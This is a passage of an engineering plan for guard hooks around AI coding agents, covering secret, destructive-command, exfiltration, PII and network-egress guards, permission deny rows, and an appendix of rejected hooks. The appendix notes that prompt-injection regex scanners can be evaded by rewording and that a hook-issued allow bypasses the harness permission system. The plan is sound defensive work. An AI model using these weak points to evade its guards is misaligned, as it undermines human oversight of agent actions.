- **What.** The §E.3 post-edit pipeline and the single D1 ruff invocation (`_ruff.py`: `RuffPin`, `run_ruff`, the D1 memo, `changed_lines`); the sync-time code filter (`ruff rule --all`, the per-code fallback of OQ-37) that renders `gc:shared.lint_buckets` and `gc:shared.ruff.*`; `RuleFrontmatter.lint_codes` (§A.7 schema, sidecar, round trip) with the codes on `python-error-handling`, `python-typing` and `pytest`; `PromptFrontmatter.write_scope` (sidecar) with the §E.3 assignments on five prompts; the renderer changes for Claude command `disallowed-tools` frontmatter (§C.4.3) and OpenCode `agent: plan`; the builtin-only `mutates_edited_file` validate check; the 8 hooks; the `scan-sinks` and `check-notebooks` twins with their opt-in pre-commit entries; the `tools.ruff` pin.
- **Files.** **New:** `hook_runtime/_ruff.py`, `hook_runtime/handlers/{ruff_feedback,deser,prompt_scope,toolchain,notebooks}.py`, `resources/hooks/feedback/<id>/HOOK.md` × 8, the two CLI command modules. **Modified:** `types.py` (`RuleFrontmatter` `:56-65`, `PromptFrontmatter` `:128-154`), `harness/manifest.py` (`_KIND_FIELDS` `:111-125`), `commands/import_harness.py` (`_rule_from_entry`, `_prompt_from_entry`), `renderer.py` (`_render_prompt_claude_command` `:282-299`, `_render_prompt_opencode_command` `:302-338`), `commands/validate.py`, `guard_config.py`, `cli.py` + `tests/unit/test_cli.py`, `.pre-commit-hooks.yaml` + `tests/integration/test_precommit_hooks_yaml.py`, `resources/rules/languages/python/{error-handling.md,typing.md.j2}`, `resources/rules/frameworks/pytest.md.j2`, `resources/prompts/{explain.md,review.md.j2,security-review.md.j2,find-injected-vulnerability.md.j2,generate-tests.md.j2}`.
- **Tests.** `tests/hooks/test_ruff_feedback.py` (including the one-D1-argv-per-event invariant), `tests/hooks/test_ml_unsafe_deserialization_guard.py`, `tests/hooks/test_<hook_id_snake>.py` for the rest, `tests/unit/test_rules_lint_codes.py` (NEW), the adapter goldens for `disallowed-tools` (sentinel on the first body line) and `agent: plan`, `tests/harness/test_manifest_roundtrip.py` and `tests/harness/test_import_roundtrip.py` (`lint_codes`, `write_scope`).
- **Done when.** With all ruff consumers enabled, exactly one D1 argv is recorded per event; a legacy unformatted file is never reformatted; `F401`/`F841`/`F811` are never fixed; rules without `lint_codes` and prompts without `write_scope` render byte-identically.

### Track K8 — Pack: secrets and risky actions

- **What.** The §E.4 shared plumbing (`PathPolicy`, `scan_text`, `SECRET_CONTENT_RULES`, `screen_regex`, `_hosts.extract_hosts`, `gitargv.commit_message_sources`, the argv0 prefilter); the 9 hooks (stop-diff-sweep is the coordinator's `secrets` stage and carries K7's deserialization Bash rescan); `_pep503.canonical_name` and the `detector._parse_dep_name` rewire; the native twins rendered through K3's managed-array operation (`permissions.deny` rows; `sandbox.*` arrays labelled speed bumps); the off-workstation twins `scan-secrets`, `check-deps` and `check-commit-trailers` with their pre-commit entries and `playbook ci` rows; the `default_install_hook_types` template key; the CI `simulate` smoke step.
- **Files.** **New:** `security/secrets.py`, `hook_runtime/_hosts.py`, `src/coding_agent_playbook/_pep503.py`, `hook_runtime/handlers/{secret_paths,secret_content,destructive,git_policy,stop_sweep,dependencies,exfil,taint,conventions}.py`, `resources/hooks/safety/<id>/HOOK.md` × 9, the three CLI command modules. **Modified:** `security/{paths,patterns}.py`, `hook_runtime/gitargv.py`, `detector.py` (`:130-138`), `adapters/claude_code_adapter.py` (native rows), `guard_config.py` (`secret_rules`, `destructive`, `allowlists`), `commands/ci.py`, `cli.py` + `tests/unit/test_cli.py`, `.pre-commit-hooks.yaml` (`playbook-secrets`), `resources/precommit/config.yaml.j2` (`coding-agent-playbook-secrets`, `coding-agent-playbook-commit-trailers`, `default_install_hook_types`), `tests/integration/test_precommit_hooks_yaml.py`, `.github/workflows/ci.yml` (`playbook-hook simulate pre_tool_use --format json < tests/fixtures/hook_payloads/claude_code/pre_tool_use/bash_rm_root.json`, asserting `"exit_code": 2`).
- **Tests.** `tests/security/test_{paths,secrets}.py`, `tests/hooks/test_<hook_id_snake>.py` × 9 (the red-team golden tables), `tests/cli/test_check_commit_trailers.py` (NEW), `tests/unit/test_detector.py` (PEP 503 normalization; no secret-glob file opened by `detect()`), `tests/adapters/test_claude_code.py` (native rows added and removed with their guard).
- **Done when.** No model-facing reason contains a secret's characters; native deny rows appear and disappear with their guard and never touch user entries; `socket.getaddrinfo` is never called by a guard; the E-Q8 changelog note is queued for K11.

### Track K9 — Pack: audit and overlay mechanisms

- **What.** The §E.5 hooks: guard-decision-log (the `HOOK.md` switch and body over K2's writer, plus the `doctor` summary), local-audit-log (`append_activity`; the async registration, OQ-19), precompact-checkpoint, and the three overlay-tier mechanisms pii-prompt-guard (`security/pii.py`; strict mode per OQ-18), network-egress-guard and sensitive-data-read-guard (shipped `tier: overlay`, `enabled: true`, inert data). A fixture overlay exercises activation end to end.
- **Files.** **New:** `security/pii.py`, `hook_runtime/handlers/{compaction,network,sensitive_reads}.py` and the handler modules for `decision_log`, `activity_log` and `pii_prompt_guard`, `resources/hooks/audit/<id>/HOOK.md` for the three audit hooks and `resources/hooks/<category>/<id>/HOOK.md` (§A.1 categories) for the three overlay-tier hooks, a fixture overlay package under `tests/` that promotes `network-egress-guard` to `tier: default` with `mandatory: true`. **Modified:** `security/audit.py` (`append_activity`), `hook_runtime/registry.py` (the decision-sink kind), `hook_runtime/doctor.py` (decision-log summary), `hook_registrations.py` and `adapters/claude_code_adapter.py` (the async registration; `onFailure: "block"` + `--strict-launch`; native rows `permissions.deny: ["WebSearch"]`, `Read(<glob>)`, `sandbox.network.allowedDomains`, `sandbox.filesystem.denyRead`), `guard_config.py` (`logging`).
- **Tests.** `tests/security/test_{audit,pii}.py`, `tests/hooks/test_<hook_id_snake>.py` × 5 (guard-decision-log is covered by `test_audit.py`), `tests/adapters/test_claude_code.py` (the async entry with lock `artifact_id = "registration:post_tool_use:async"`; strict-mode goldens), `tests/adapters/test_claude_launcher.py` (`--strict-launch` with a missing pin exits 1).
- **Done when.** Engine defaults render nothing for overlay-tier hooks; the fixture overlay activates them, and `[hooks] disable` cannot turn off its mandatory hook (H15); decision and audit lines carry no command, path, prompt or env text; the async dispatch writes empty stdout.

### Track K10 — New tools: coverage, quality metrics, docstrings, commit names

- **What.** §F minus the groundwork that landed in P (F.0.3 items 1 and 7) and the `playbook ci` skeleton from K6. F.0.3 items 2–6 and 8: metric selection, `--changed`, measurement snapshots, `[metrics] exclude`, `--run-tests/--no-run-tests`, usage errors. F.1: `diff_coverage` + `git_diff.changed_lines`, the `CoverageReport` and `ProjectHandle` extensions, the `CoverageCheck(warn=0.8)` fix, the `has_dev_dependency` predicate, and the `coverage-diff-gate` hook with the shared `SuiteRun` (one suite run with K6's `tests` stage). F.2: `ruff_violations`, `file_sloc`, `[metrics.ruff_violations]`, the `ruff_violations` selection in the `quality-metrics` stage, and the `quality` post-edit bucket. F.3: the `python-docstrings` rule, the `docstring-nonregression` stage and post-edit bucket, and the opt-in `docstring_example` (per OQ-42). F.4: the `commit-message-convention` hook, the `tools.cz` pin and the commit-msg twins. F.5: the `metrics`, `coverage` and `commit-convention` CI steps with the committer-date cut-over filter. The pre-commit changes: `--no-run-tests` on both metrics entries, `playbook-coverage` (manual), `playbook-commit-msg`.
- **Files.** As §F.6, except `evaluators/metrics_gate.py` (Track P) and the creation of `commands/ci.py` (K6). Plus `resources/rules/languages/python/docstrings.md`, `resources/hooks/verify/{coverage-diff-gate,docstring-nonregression}/HOOK.md`, `resources/hooks/safety/commit-message-convention/HOOK.md`, the `quality` and `docstrings` buckets in `hook_runtime/_ruff.py` / `handlers/ruff_feedback.py`, `tests/integration/test_precommit_hooks_yaml.py` (`:51`, `:65`).
- **Tests.** As F.1.4, F.2.4, F.3.2, F.3.4, F.4.2 and F.4.4, plus F.1.2's `tests/hooks/test_coverage_diff_gate.py`.
- **Done when.** `tests/evaluators/test_metric.py`'s default static set is unchanged; `CoverageCheck()` at 100% grades `ok`; enabling both `tests` and `coverage` performs exactly one `ProjectHandle.run`; the cut-over filter test passes; both metrics pre-commit entries carry `--no-run-tests`; the commitizen start-up cost on `git commit` segments has been measured (F.4.2 marks 0.1–0.3 s as an estimate).

## Appendix R — Rejected hooks

The 9 `rejected` catalog entries stay rejected.

| id | Catalog event | Why rejected | Where it belongs instead |
| --- | --- | --- | --- |
| scoped-rule-injection | post_tool_use | A rendering problem, not a lifecycle one: it would fire on every Read (the most frequent call), and 3 of the 4 scoped starter rules glob `**/*.py`, so a Python repo saves nothing. | The adapters: Claude Code renders scoped rules natively (`.claude/rules/<id>.md` with `paths:`), Continue honors globs, AGENTS.md keeps the advisory note. |
| guardrail-self-test | session_start | Circular: a broken interpreter, entry point or runtime fails the self-test open silently too. | The briefing heartbeat line plus the CLAUDE.md line that reports its absence (§E.1, §C.4.2), and `playbook-hook doctor` (§D.9). |
| auto-commit-checkpoint | post_tool_use | Rewrites the user-owned authorship and commit policy, fills history with WIP commits, and turns commit-time gates into per-turn side effects. | The harness's own undo/rewind or the user's VCS workflow. |
| input-rewriting-hooks | pre_tool_use | L6 forbids `updatedInput`: rewriters race (last writer wins; a user may already run their own rewriting hook), hide the correction from the model, and an overlay rewriter can change what the user approved. | Deny-with-correction (command-convention-guard, §E.4); `playbook validate` rejects input rewriting (H8). |
| permission-auto-approve | pre_tool_use | L6 forbids `allow`: a hook-issued allow bypasses the harness permission system, so any overlay or malicious PR shipping one is a privilege escalation. | Reviewed, opt-in `permissions.allow` rendering of the remediation commands (§C.2.8, OQ-16). |
| http-audit-exporter | post_tool_use | L8: no HTTP hooks, no telemetry, air-gapped. | An org's own log shipper pointed at the local decision/audit logs (§E.5), or an explicit opt-in overlay exporter per SPEC §17.4. |
| prompt-injection-regex-scanner | post_tool_use | Evadable by rewording and noisy on security code and docs; hooks are not a security boundary. | taint-escalation (§E.4), the deterministic, content-free alternative; a regex scanner may live in an org overlay as an explicit opt-in. |
| per-edit-full-gate | post_tool_use | Tens of seconds per edit, blocks intermediate states, and runs agent-written `conftest.py` and mypy plugins with no permission prompt on every edit. | The single-file post-edit ruff call (§E.3), mypy/pytest as trusted Stop stages (§D.5, §E.2), and CI as the authority. |
| notification-tts | stop | Personal UX with no coding-practice value; varies per user and OS. | User-level settings, not org-distributed canonical content. |
